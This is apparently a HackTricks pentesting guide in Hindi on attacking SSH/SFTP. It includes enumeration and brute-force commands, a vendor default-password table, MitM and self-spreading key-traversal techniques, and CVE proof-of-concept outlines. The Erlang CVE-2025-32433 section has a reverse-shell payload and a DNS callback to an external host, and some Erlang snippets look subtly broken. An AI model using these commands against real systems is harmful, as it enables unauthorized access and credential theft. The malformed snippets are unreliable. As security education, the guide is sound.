# 22 - Pentesting SSH/SFTP

{{#include ../banners/hacktricks-training.md}}

## बुनियादी जानकारी

**SSH (Secure Shell or Secure Socket Shell)** एक नेटवर्क प्रोटोकॉल है जो असुरक्षित नेटवर्क पर किसी कंप्यूटर के साथ सुरक्षित कनेक्शन सक्षम करता है। रिमोट सिस्टम तक पहुँचने के दौरान डेटा की गोपनीयता और अखंडता बनाए रखने के लिए यह आवश्यक है।

**Default port:** 22
```
22/tcp open  ssh     syn-ack
```
**SSH सर्वर:**

- [openSSH](http://www.openssh.org) – OpenBSD SSH, BSD, Linux distributions और Windows (Windows 10 से) में शिप किया जाता है
- [Dropbear](https://matt.ucc.asn.au/dropbear/dropbear.html) – कम मेमोरी और प्रोसेसर संसाधनों वाले वातावरण के लिए SSH implementation, OpenWrt में शिप किया जाता है
- [PuTTY](https://www.chiark.greenend.org.uk/~sgtatham/putty/) – Windows के लिए SSH implementation; client सामान्यतः उपयोग किया जाता है पर server का उपयोग कम सामान्य है
- [CopSSH](https://www.itefix.net/copssh) – Windows के लिए OpenSSH का implementation

**SSH libraries (implementing server-side):**

- [libssh](https://www.libssh.org) – मल्टिप्लैटफ़ॉर्म C लाइब्रेरी जो SSHv2 प्रोटोकॉल को लागू करती है और [Python](https://github.com/ParallelSSH/ssh-python), [Perl](https://github.com/garnier-quentin/perl-libssh/) और [R](https://github.com/ropensci/ssh) में bindings प्रदान करती है; इसे KDE द्वारा sftp के लिए और GitHub द्वारा git SSH infrastructure के लिए उपयोग किया जाता है
- [wolfSSH](https://www.wolfssl.com/products/wolfssh/) – SSHv2 server लाइब्रेरी जो ANSI C में लिखी गई है और embedded, RTOS, और संसाधन-सीमित वातावरण के लिए लक्षित है
- [Apache MINA SSHD](https://mina.apache.org/sshd-project/index.html) – Apache SSHD java लाइब्रेरी Apache MINA पर आधारित है
- [paramiko](https://github.com/paramiko/paramiko) – Python SSHv2 प्रोटोकॉल लाइब्रेरी

## Enumeration

### Banner Grabbing
```bash
nc -vn <IP> 22
```
### स्वचालित ssh-audit

ssh-audit ssh सर्वर और क्लाइंट कॉन्फ़िगरेशन ऑडिट करने का एक टूल है।

[https://github.com/jtesta/ssh-audit](https://github.com/jtesta/ssh-audit), [https://github.com/arthepsy/ssh-audit/](https://github.com/arthepsy/ssh-audit/) का एक अपडेटेड fork है

**विशेषताएँ:**

- SSH1 और SSH2 प्रोटोकॉल सर्वर का समर्थन;
- SSH क्लाइंट कॉन्फ़िगरेशन का विश्लेषण;
- banner प्राप्त करना, डिवाइस या सॉफ़्टवेयर और ऑपरेटिंग सिस्टम की पहचान करना, संपीड़न का पता लगाना;
- key-exchange, host-key, encryption और message authentication code अल्गोरिदम एकत्रित करना;
- अल्गोरिदम जानकारी आउटपुट करना (available since, removed/disabled, unsafe/weak/legacy, etc);
- अल्गोरिदम अनुशंसाएँ आउटपुट करना (append or remove based on recognized software version);
- सुरक्षा जानकारी आउटपुट (related issues, assigned CVE list, etc);
- अल्गोरिदम जानकारी के आधार पर SSH वर्जन संगतता का विश्लेषण;
- OpenSSH, Dropbear SSH और libssh से ऐतिहासिक जानकारी;
- Linux और Windows पर चलता है;
- कोई निर्भरता नहीं
```bash
usage: ssh-audit.py [-1246pbcnjvlt] <host>

-1,  --ssh1             force ssh version 1 only
-2,  --ssh2             force ssh version 2 only
-4,  --ipv4             enable IPv4 (order of precedence)
-6,  --ipv6             enable IPv6 (order of precedence)
-p,  --port=<port>      port to connect
-b,  --batch            batch output
-c,  --client-audit     starts a server on port 2222 to audit client
software config (use -p to change port;
use -t to change timeout)
-n,  --no-colors        disable colors
-j,  --json             JSON output
-v,  --verbose          verbose output
-l,  --level=<level>    minimum output level (info|warn|fail)
-t,  --timeout=<secs>   timeout (in seconds) for connection and reading
(default: 5)
$ python3 ssh-audit <IP>
```
[See it in action (Asciinema)](https://asciinema.org/a/96ejZKxpbuupTK9j7h8BdClzp)

### सर्वर की सार्वजनिक SSH कुंजी
```bash
ssh-keyscan -t rsa <IP> -p <PORT>
```
### कमजोर सिफ़र एल्गोरिदम

यह डिफ़ॉल्ट रूप से **nmap** द्वारा खोजा जाता है। लेकिन आप **sslcan** या **sslyze** का भी उपयोग कर सकते हैं।

### Nmap scripts
```bash
nmap -p22 <ip> -sC # Send default nmap scripts for SSH
nmap -p22 <ip> -sV # Retrieve version
nmap -p22 <ip> --script ssh2-enum-algos # Retrieve supported algorythms
nmap -p22 <ip> --script ssh-hostkey --script-args ssh_hostkey=full # Retrieve weak keys
nmap -p22 <ip> --script ssh-auth-methods --script-args="ssh.user=root" # Check authentication methods
```
### Shodan

- `ssh`

## Brute force usernames, passwords and private keys

### Username Enumeration

OpenSSH के कुछ संस्करणों में आप उपयोगकर्ताओं को enumerate करने के लिए एक timing attack कर सकते हैं। इसे exploit करने के लिए आप metasploit module का उपयोग कर सकते हैं:
```
msf> use scanner/ssh/ssh_enumusers
```
### [Brute force](../generic-hacking/brute-force.md#ssh)

कुछ सामान्य ssh credentials [here ](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt)and [here](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt) और नीचे दिए गए हैं।

### Private Key Brute Force

यदि आपको कुछ ssh private keys पता हैं जो उपयोग किए जा सकते हैं... तो चलिए आजमाते हैं। आप nmap script का उपयोग कर सकते हैं:
```
https://nmap.org/nsedoc/scripts/ssh-publickey-acceptance.html
```
या MSF auxiliary module:
```
msf> use scanner/ssh/ssh_identify_pubkeys
```
या उपयोग करें `ssh-keybrute.py` (native python3, lightweight और legacy algorithms enabled): [snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute).

#### ज्ञात badkeys यहाँ पाए जा सकते हैं:


{{#ref}}
https://github.com/rapid7/ssh-badkeys/tree/master/authorized
{{#endref}}

#### कमजोर SSH keys / Debian predictable PRNG

कुछ सिस्टमों में cryptographic material जनरेट करने के लिए उपयोग किए जाने वाले random seed में ज्ञात खामियाँ होती हैं। इससे keyspace नाटकीय रूप से घट सकता है, जिसे bruteforce किया जा सकता है। Debian सिस्टमों पर weak PRNG से प्रभावित प्री-जनरेट किए गए keys के सेट यहाँ उपलब्ध हैं: [g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh).

आपको victim machine के लिए valid keys खोजने हेतु यहाँ देखना चाहिए।

### Kerberos / GSSAPI SSO

यदि लक्षित SSH server GSSAPI का समर्थन करता है (उदाहरण के लिए domain controller पर Windows OpenSSH), तो आप पासवर्ड की बजाय अपने Kerberos TGT का उपयोग करके authenticate कर सकते हैं।

Workflow from a Linux attacker host:
```bash
# 1) Ensure time is in sync with the KDC to avoid KRB_AP_ERR_SKEW
sudo ntpdate <dc.fqdn>

# 2) Generate a krb5.conf for the target realm (optional, but handy)
netexec smb <dc.fqdn> -u <user> -p '<pass>' -k --generate-krb5-file krb5.conf
sudo cp krb5.conf /etc/krb5.conf

# 3) Obtain a TGT for the user
kinit <user>
klist

# 4) SSH with GSSAPI, using the FQDN that matches the host SPN
ssh -o GSSAPIAuthentication=yes <user>@<host.fqdn>
```
Notes:
- यदि आप गलत नाम से कनेक्ट करते हैं (उदा., short host, alias, या `/etc/hosts` में गलत क्रम), तो आपको मिल सकता है: "Server not found in Kerberos database" क्योंकि SPN मेल नहीं खाता।
- `crackmapexec ssh --kerberos` आपका ccache Kerberos प्रमाणीकरण के लिए भी उपयोग कर सकता है।

## डिफ़ॉल्ट क्रेडेंशियल्स

| **वेंडर** | **यूज़रनेम्स**                                                                                               | **पासवर्ड्स**                                                                                                                                                                                             |
| ---------- | ----------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| APC        | apc, device                                                                                                 | apc                                                                                                                                                                                                       |
| Brocade    | admin                                                                                                       | admin123, password, brocade, fibranne                                                                                                                                                                     |
| Cisco      | admin, cisco, enable, hsa, pix, pnadmin, ripeop, root, shelladmin                                           | admin, Admin123, default, password, secur4u, cisco, Cisco, _Cisco, cisco123, C1sco!23, Cisco123, Cisco1234, TANDBERG, change_it, 12345, ipics, pnadmin, diamond, hsadb, c, cc, attack, blender, changeme |
| Citrix     | root, nsroot, nsmaint, vdiadmin, kvm, cli, admin                                                            | C1trix321, nsroot, nsmaint, kaviza, kaviza123, freebsd, public, rootadmin, wanscaler                                                                                                                      |
| D-Link     | admin, user                                                                                                 | private, admin, user                                                                                                                                                                                      |
| Dell       | root, user1, admin, vkernel, cli                                                                            | calvin, 123456, password, vkernel, Stor@ge!, admin                                                                                                                                                        |
| EMC        | admin, root, sysadmin                                                                                       | EMCPMAdm7n, Password#1, Password123#, sysadmin, changeme, emc                                                                                                                                             |
| HP/3Com    | admin, root, vcx, app, spvar, manage, hpsupport, opc_op                                                     | admin, password, hpinvent, iMC123, pvadmin, passw0rd, besgroup, vcx, nice, access, config, 3V@rpar, 3V#rpar, procurve, badg3r5, OpC_op, !manage, !admin                                                   |
| Huawei     | admin, root                                                                                                 | 123456, admin, root, Admin123, Admin@storage, Huawei12#$, HwDec@01, hwosta2.0, HuaWei123, fsp200@HW, huawei123                                                                                            |
| IBM        | USERID, admin, manager, mqm, db2inst1, db2fenc1, dausr1, db2admin, iadmin, system, device, ufmcli, customer | PASSW0RD, passw0rd, admin, password, Passw8rd, iadmin, apc, 123456, cust0mer                                                                                                                              |
| Juniper    | netscreen                                                                                                   | netscreen                                                                                                                                                                                                 |
| NetApp     | admin                                                                                                       | netapp123                                                                                                                                                                                                 |
| Oracle     | root, oracle, oravis, applvis, ilom-admin, ilom-operator, nm2user                                           | changeme, ilom-admin, ilom-operator, welcome1, oracle                                                                                                                                                     |
| VMware     | vi-admin, root, hqadmin, vmware, admin                                                                      | vmware, vmw@re, hqadmin, default                                                                                                                                                                          |

## SSH-MitM

यदि आप स्थानीय नेटवर्क में उस शिकार के पास हैं जो username और password का उपयोग करके SSH सर्वर से कनेक्ट करने जा रहा है, तो आप उन क्रेडेंशियल्स को चुराने के लिए **MitM attack करना** आज़मा सकते हैं:

**Attack path:**

- **Traffic Redirection:** हमलावर पीड़ित के ट्रैफ़िक को अपनी मशीन पर **मोड़ता है**, और प्रभावी रूप से SSH सर्वर के कनेक्शन प्रयास को **इंटरसेप्ट** कर लेता है।
- **Interception and Logging:** हमलावर की मशीन एक **प्रॉक्सी** की तरह काम करती है, वैध SSH सर्वर बनकर उपयोगकर्ता के लॉगिन विवरण को **कैप्चर** करती है।
- **Command Execution and Relay:** अंततः, हमलावर का सर्वर उपयोगकर्ता के क्रेडेंशियल्स को **लॉग** करता है, कमांड्स को वास्तविक SSH सर्वर को **फॉरवर्ड** करता है, उन्हें **एक्जीक्यूट** करवाता है, और परिणाम उपयोगकर्ता को वापस **भेज देता है**, जिससे पूरा प्रोसेस निर्बाध और वैध दिखता है।

[**SSH MITM**](https://github.com/jtesta/ssh-mitm) ठीक वही करता है जो ऊपर वर्णित है।

वास्तविक MitM को अंजाम देने के लिए आप ARP spoofing, DNS spoofin जैसी तकनीकों या [**Network Spoofing attacks**](../generic-methodologies-and-resources/pentesting-network/index.html#spoofing) में वर्णित अन्य तरीकों का उपयोग कर सकते हैं।

## SSH-Snake

यदि आप नेटवर्क में उन सिस्टम्स पर मिली SSH private keys का उपयोग करके traversal करना चाहते हैं, और प्रत्येक सिस्टम की private key का उपयोग कर नए hosts पर पहुँच बनाना चाहते हैं, तो [**SSH-Snake**](https://github.com/MegaManSec/SSH-Snake) आपकी जरूरत का टूल है।

SSH-Snake स्वचालित और पुनरावर्ती रूप से निम्न कार्य करता है:

1. वर्तमान सिस्टम पर किसी भी SSH private keys को ढूँढना,
2. वर्तमान सिस्टम पर किसी भी hosts या destinations (user@host) को ढूँढना जहाँ ये private keys स्वीकार हो सकती हैं,
3. खोजी गई सभी private keys का उपयोग करके सभी destinations में SSH करने का प्रयास करना,
4. यदि किसी destination से सफलतापूर्वक कनेक्ट हो जाता है, तो कनेक्ट किए गए सिस्टम पर चरण #1 - #4 को दोहराना।

यह पूरी तरह से self-replicating और self-propagating है — और पूरी तरह fileless है।

## कॉन्फ़िग मिसकन्फ़िगरेशन

### रूट लॉगिन

अधिकांश SSH सर्वरों में डिफ़ॉल्ट रूप से root user login की अनुमति देना सामान्य है, जो एक गंभीर सुरक्षा जोखिम पैदा करता है। सर्वर को सुरक्षित बनाने के लिए **रूट लॉगिन को अक्षम करना** एक निर्णायक कदम है। प्रशासनिक विशेषाधिकारों के साथ अनधिकृत पहुँच और brute force हमलों को इस परिवर्तन से घटाया जा सकता है।

OpenSSH में Root Login अक्षम करने के लिए:

1. `sudoedit /etc/ssh/sshd_config` के साथ **SSH config फाइल संपादित** करें
2. सेटिंग को `#PermitRootLogin yes` से बदलकर **`PermitRootLogin no`** करें।
3. कॉन्फ़िगरेशन को रीलोड करें: `sudo systemctl daemon-reload`
4. परिवर्तन लागू करने के लिए SSH सर्वर को रिस्टार्ट करें: `sudo systemctl restart sshd`

### SFTP Brute Force

- [**SFTP Brute Force**](../generic-hacking/brute-force.md#sftp)

### SFTP command execution

SFTP सेटअप्स में एक आम चूक तब होती है जब व्यवस्थापक चाहते हैं कि उपयोगकर्ता केवल फ़ाइलें बदलें और remote shell एक्सेस सक्षम न हो। भले ही उपयोगकर्ताओं को non-interactive shells (उदा., `/usr/bin/nologin`) दिए गए हों और उन्हें किसी विशिष्ट डायरेक्टरी में सीमित किया गया हो, एक सुरक्षा शून्य बना रह जाता है। **उपयोगकर्ता इन प्रतिबंधों को बायपास कर सकते हैं** अगर वे लॉगिन करने के तुरंत बाद किसी कमांड (जैसे `/bin/bash`) के निष्पादन का अनुरोध कर दें, इससे पहले कि उनका निर्दिष्ट non-interactive shell सक्रिय हो। इससे अनाधिकृत कमांड निष्पादन संभव हो जाता है और तय सुरक्षा उपायों की प्रभावशीलता कमजोर हो जाती है।

[Example from here](https://community.turgensec.com/ssh-hacking-guide/):
```bash
ssh -v noraj@192.168.1.94 id
...
Password:
debug1: Authentication succeeded (keyboard-interactive).
Authenticated to 192.168.1.94 ([192.168.1.94]:22).
debug1: channel 0: new [client-session]
debug1: Requesting no-more-sessions@openssh.com
debug1: Entering interactive session.
debug1: pledge: network
debug1: client_input_global_request: rtype hostkeys-00@openssh.com want_reply 0
debug1: Sending command: id
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
uid=1000(noraj) gid=100(users) groups=100(users)
debug1: channel 0: free: client-session, nchannels 1
Transferred: sent 2412, received 2480 bytes, in 0.1 seconds
Bytes per second: sent 43133.4, received 44349.5
debug1: Exit status 0

$ ssh noraj@192.168.1.94 /bin/bash
```
यहाँ उपयोगकर्ता `noraj` के लिए सुरक्षित SFTP कॉन्फ़िगरेशन (`/etc/ssh/sshd_config` – openSSH) का एक उदाहरण है:
```
Match User noraj
ChrootDirectory %h
ForceCommand internal-sftp
AllowTcpForwarding no
PermitTunnel no
X11Forwarding no
PermitTTY no
```
यह कॉन्फ़िगरेशन केवल SFTP की अनुमति देगा: shell access को बंद करने के लिए start command को मजबूर करना और TTY access को अक्षम करना, साथ ही सभी प्रकार के port forwarding या tunneling को भी अक्षम करना।

### SFTP Tunneling

यदि आपके पास किसी SFTP सर्वर तक पहुँच है, तो आप अपने ट्रैफ़िक को इसके माध्यम से भी tunnel कर सकते हैं, उदाहरण के लिए सामान्य port forwarding का उपयोग करके:
```bash
sudo ssh -L <local_port>:<remote_host>:<remote_port> -N -f <username>@<ip_compromised>
```
### SFTP Symlink

**sftp** में "**symlink**" कमांड होती है। इसलिए, अगर आपके पास किसी फ़ोल्डर में **लिखने के अधिकार** हैं, तो आप **अन्य फ़ोल्डर/फ़ाइलों** के **symlinks** बना सकते हैं। चूँकि आप सम्भवतः **trapped** एक chroot के अंदर हैं, यह **आपके लिए खास तौर पर उपयोगी नहीं होगा**, लेकिन अगर आप बनाए गए **symlink** को किसी **no-chroot** **service** से **access** कर सकें (उदाहरण के लिए, अगर आप वेब से **symlink** तक पहुँच सकते हैं), तो आप **वेब के माध्यम से symlinked files खोल सकते हैं**।

उदाहरण के लिए, एक नया फ़ाइल **"**_**froot**_**" से **symlink** बनाकर इसे "**_**/**_**" पर पॉइंट करने के लिए:
```bash
sftp> symlink / froot
```
यदि आप वेब के माध्यम से फ़ाइल "_froot_" तक पहुँच सकते हैं, तो आप सिस्टम के root ("/") फ़ोल्डर की सूची प्राप्त कर पाएँगे।

### प्रमाणीकरण विधियाँ

उच्च सुरक्षा वाले वातावरण में सामान्य प्रथा यह है कि साधारण password-आधारित प्रमाणीकरण के बजाय केवल key-based या दो-कारक प्रमाणीकरण सक्षम किया जाए। लेकिन अक्सर मजबूत प्रमाणीकरण विधियाँ सक्षम कर दी जाती हैं बिना कमजोर विधियों को अक्षम किए। एक आम मामला openSSH के कॉन्फ़िगरेशन में `publickey` को सक्षम करना और उसे डिफ़ॉल्ट विधि सेट कर देना है पर `password` को अक्षम न करना। इसलिए SSH client के verbose mode का उपयोग करके an attacker देख सकता है कि कमजोर विधि सक्षम है:
```bash
ssh -v 192.168.1.94
OpenSSH_8.1p1, OpenSSL 1.1.1d  10 Sep 2019
...
debug1: Authentications that can continue: publickey,password,keyboard-interactive
```
उदाहरण के लिए, यदि कोई authentication failure limit सेट किया गया है और आपको कभी password विधि तक पहुँचने का मौका नहीं मिलता, तो आप इस विधि का उपयोग करने के लिए `PreferredAuthentications` विकल्प का प्रयोग करके मजबूर कर सकते हैं।
```bash
ssh -v 192.168.1.94 -o PreferredAuthentications=password
...
debug1: Next authentication method: password
```
SSH सर्वर कॉन्फ़िगरेशन की समीक्षा आवश्यक है ताकि केवल अपेक्षित methods अधिकृत हों। क्लाइंट पर verbose mode का उपयोग कॉन्फ़िगरेशन की प्रभावशीलता देखने में मदद कर सकता है।

### कॉन्फ़िग फ़ाइलें
```bash
ssh_config
sshd_config
authorized_keys
ssh_known_hosts
known_hosts
id_rsa
```
## Fuzzing

- [https://packetstormsecurity.com/files/download/71252/sshfuzz.txt](https://packetstormsecurity.com/files/download/71252/sshfuzz.txt)
- [https://www.rapid7.com/db/modules/auxiliary/fuzzers/ssh/ssh_version_2](https://www.rapid7.com/db/modules/auxiliary/fuzzers/ssh/ssh_version_2)

## हालिया गंभीर कमजोरियाँ (2024)

### CVE-2024-6387 – regreSSHion signal-handler race

OpenSSH 8.5p1–9.7p1 ने sshd के `SIGALRM` हैंडलर के अंदर async-safe logging guard हटा दिया, जिससे CVE-2006-5051 पुनः सक्रिय हो गया और बिना प्रमाणीकृत attackers को `LoginGraceTime` समाप्त होते ही glibc heap को भ्रष्ट करने की अनुमति मिलती है। Qualys ने इस बग को 32-bit Linux पर root RCE के लिए weaponize किया और नोट किया कि पर्याप्त grooming प्रयासों से 64-bit टार्गेट अभी भी brute-forceable रहते हैं, इसलिए उन होस्ट्स को प्राथमिकता दें जो banner grabs के दौरान अभी भी उन वर्जनों का खुलासा करते हैं।

शोषण timing-आधारित है: daemon पर ऐसे half-open sessions से दबाव डालें जो कभी authenticate न हों, ताकि privileged monitor बार-बार vulnerable signal path को ट्रिगर करे जबकि आप allocator state को आकार दे रहे हों।

ऑपरेटर सुझाव:

- बिल्ड्स को `ssh -V` (remote banner) या `ssh -G <target> | grep ^userauths` से fingerprint करें और पुष्टि करें कि `LoginGraceTime` शून्य नहीं है।
- लैब लक्ष्य का pressure-test ऐसे short-lived sessions spam करके करें जो कोई authentication request न करें, उदाहरण के लिए:
```bash
parallel -j200 "timeout 3 ssh -o PreferredAuthentications=none -o ConnectTimeout=2 attacker@${TARGET}" ::: {1..4000}
```
- जिन होस्ट्स पर `LoginGraceTime 0` लागू है वे कभी buggy code path को नहीं छूते — केवल `MaxStartups` को समाप्त करके DoS कोण की उम्मीद रखें।

### CVE-2024-3094 – xz/liblzma supply-chain backdoor

XZ Utils 5.6.0 और 5.6.1 में trojanized release tarballs शामिल थे जिनके build scripts x86-64 Linux पर Debian/RPM पैकेजिंग के दौरान एक hidden object अनपैक करते हैं। यह payload glibc के `IFUNC` resolver का दुरुपयोग करके sshd में `RSA_public_decrypt` को hook करता है (जब systemd patches liblzma को लोड करने के लिए मजबूर करते हैं) और attacker-signed packets को pre-auth code execution के लिए स्वीकार करता है।

चूँकि malicious logic केवल उन packaged binaries के अंदर रहती है, offensive validation को यह जांचना होगा कि victim ने वास्तव में क्या इंस्टॉल किया है: `xz --version`, `rpm -qi xz`/`dpkg -l xz-utils` की जाँच करें, `/usr/lib*/liblzma.so*` के hashes की तुलना करें, और देखें कि `ldd /usr/sbin/sshd | grep -E "systemd|lzma"` से क्या sshd ने compromised dependency को लोड किया है। Hook तब तक dormant रहता है जब तक process path `/usr/sbin/sshd` न हो, इसलिए backdoor को लैब में reproduce करने के लिए अक्सर distro build environment को recreate करना आवश्यक होता है।

## Authentication State-Machine Bypass (Pre-Auth RCE)

कई SSH server implementations में **authentication finite-state machine** में लॉजिक की कमियाँ हैं जो क्लाइंट को *connection-protocol* संदेश भेजने की अनुमति देती हैं **authentication पूरा होने से पहले**। चूँकि सर्वर यह सत्यापित करने में विफल रहता है कि वह सही state में है, उन संदेशों को ऐसे हैंडल किया जाता है मानो उपयोगकर्ता पूरी तरह authenticated हो, जिससे **unauthenticated code execution** या session creation हो सकता है।

प्रोटोकॉल स्तर पर किसी भी SSH संदेश का _message code_ **≥ 80** (0x50) *connection* layer (RFC 4254) से संबंधित होता है और इसे **केवल successful authentication के बाद ही स्वीकार किया जाना चाहिए** (RFC 4252)। यदि सर्वर उन संदेशों में से किसी को अभी भी *SSH_AUTHENTICATION* state में रहते हुए प्रोसेस करता है, तो attacker तुरंत एक channel बना सकता है और command execution, port-forwarding आदि जैसे कार्यों का अनुरोध कर सकता है।

### Generic Exploitation Steps
1. लक्ष्य के SSH पोर्ट पर TCP कनेक्शन स्थापित करें (आम तौर पर 22, लेकिन अन्य सेवाएँ Erlang/OTP को 2022, 830, 2222… पर एक्सपोज कर सकती हैं)।
2. एक raw SSH packet बनाएं:
* 4-byte **packet_length** (big-endian)
* 1-byte **message_code** ≥ 80 (e.g. `SSH_MSG_CHANNEL_OPEN` = 90, `SSH_MSG_CHANNEL_REQUEST` = 98)
* Payload जो चुने गए message type द्वारा समझा जाएगा
3. packet(s) भेजें **किसी भी authentication step को पूरा किए बिना**।
4. उन server APIs के साथ इंटरैक्ट करें जो अब _pre-auth_ में एक्सपोज हो चुकी हैं (command execution, port forwarding, file-system access, …).

Python proof-of-concept outline:
```python
import socket, struct
HOST, PORT = '10.10.10.10', 22
s = socket.create_connection((HOST, PORT))
# skip version exchange for brevity – send your own client banner then read server banner
# … key exchange can be skipped on vulnerable Erlang/OTP because the bug is hit immediately after the banner
# Packet: len(1)=1, SSH_MSG_CHANNEL_OPEN (90)
pkt  = struct.pack('>I', 1) + b'\x5a'  # 0x5a = 90
s.sendall(pkt)
# additional CHANNEL_REQUEST packets can follow to run commands
```
व्यवहार में आपको target implementation के अनुसार key-exchange करना (या छोड़ना) होगा, लेकिन **no authentication** कभी भी किया नहीं जाता।

---
### Erlang/OTP `sshd` (CVE-2025-32433)
* **प्रभावित संस्करण:** OTP < 27.3.3, 26.2.5.11, 25.3.2.20
* **मूल कारण:** Erlang native SSH daemon वर्तमान state को `ssh_connection:handle_msg/2` को invoke करने से पहले सत्यापित नहीं करता है। इसलिए कोई भी packet जिसका message code 80-255 है connection handler तक पहुँच जाता है जबकि session अभी भी *userauth* state में है।
* **प्रभाव:** unauthenticated **remote code execution** (daemon आमतौर पर embedded/OT devices पर **root** के रूप में चलता है).

Example payload that spawns a reverse shell bound to the attacker-controlled channel:
```erlang
% open a channel first … then:
execSinet:cmd(Channel, "exec('/bin/sh', ['-i'], [{fd, Channel#channel.fd}, {pid, true}]).").
```
Blind RCE / out-of-band detection को DNS के माध्यम से किया जा सकता है:
```erlang
execSinet:gethostbyname("<random>.dns.outbound.watchtowr.com").Zsession
```
Detection & Mitigation:
* Inspect SSH traffic: **authentication से पहले देखा गया message code ≥ 80 वाले किसी भी पैकेट को drop करें**.
* Upgrade Erlang/OTP to **27.3.3 / 26.2.5.11 / 25.3.2.20** या नया वर्शन।
* प्रबंधन पोर्ट्स (22/2022/830/2222) के एक्सपोज़र को सीमित करें – विशेष रूप से OT उपकरणों पर।

---
### Other Implementations Affected
* **libssh** 0.6 – 0.8 (server side) – **CVE-2018-10933** – क्लाइंट द्वारा भेजे गए अनऑथेन्टिकेटेड `SSH_MSG_USERAUTH_SUCCESS` को स्वीकार करता है, जो प्रभावतः उल्टी लॉजिक त्रुटि है।

सामान्य सबक यह है कि RFC-निर्धारित state transitions से कोई भी विचलन घातक हो सकता है; जब आप SSH daemons की समीक्षा या fuzzing कर रहे हों तो विशेष ध्यान *state-machine enforcement* पर दें।



## References

- [Unit 42 – Erlang/OTP SSH CVE-2025-32433](https://unit42.paloaltonetworks.com/erlang-otp-cve-2025-32433/)
- [SSH hardening guides](https://www.ssh-audit.com/hardening_guides.html)
- [Turgensec SSH hacking guide](https://community.turgensec.com/ssh-hacking-guide)
- [Pentesting Kerberos (88) – client setup and troubleshooting](pentesting-kerberos-88/README.md)
- [0xdf – HTB: TheFrizz](https://0xdf.gitlab.io/2025/08/23/htb-thefrizz.html)
- [Qualys – regreSSHion remote unauthenticated code execution in OpenSSH server](https://blog.qualys.com/vulnerabilities-threat-research/2024/07/01/regresshion-remote-unauthenticated-code-execution-vulnerability-in-openssh-server)
- [Snyk – The XZ backdoor (CVE-2024-3094)](https://snyk.io/blog/the-xz-backdoor-cve-2024-3094/)

## HackTricks Automatic Commands
```
Protocol_Name: SSH
Port_Number: 22
Protocol_Description: Secure Shell Hardening

Entry_1:
Name: Hydra Brute Force
Description: Need Username
Command: hydra -v -V -u -l {Username} -P {Big_Passwordlist} -t 1 {IP} ssh

Entry_2:
Name: consolesless mfs enumeration
Description: SSH enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_version; set RHOSTS {IP}; set RPORT 22; run; exit' && msfconsole -q -x 'use scanner/ssh/ssh_enumusers; set RHOSTS {IP}; set RPORT 22; run; exit' && msfconsole -q -x 'use auxiliary/scanner/ssh/juniper_backdoor; set RHOSTS {IP}; set RPORT 22; run; exit'

```
{{#include ../banners/hacktricks-training.md}}
